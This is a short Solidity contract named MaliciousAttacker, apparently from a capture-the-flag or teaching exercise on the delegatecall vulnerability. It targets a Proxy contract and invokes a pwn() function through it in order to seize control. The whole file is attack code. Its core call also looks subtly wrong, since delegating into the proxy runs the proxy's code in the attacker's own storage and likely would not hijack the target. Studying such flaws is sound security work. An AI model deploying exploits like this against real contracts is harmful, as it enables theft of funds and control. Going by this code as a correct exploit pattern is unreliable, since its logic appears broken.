// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./Delegatecall.sol";

contract MaliciousAttacker {
    Proxy public proxy;

    constructor(address _proxyAddress) {
        proxy = Proxy(_proxyAddress);
    }

    function attack() public {
        // Call the pwn() function in the Delegate contract
        // through the delegatecall in the Proxy contract
        (bool success, ) = address(proxy).delegatecall(abi.encodeWithSignature("pwn()"));
        require(success, "Delegatecall failed");
    }
}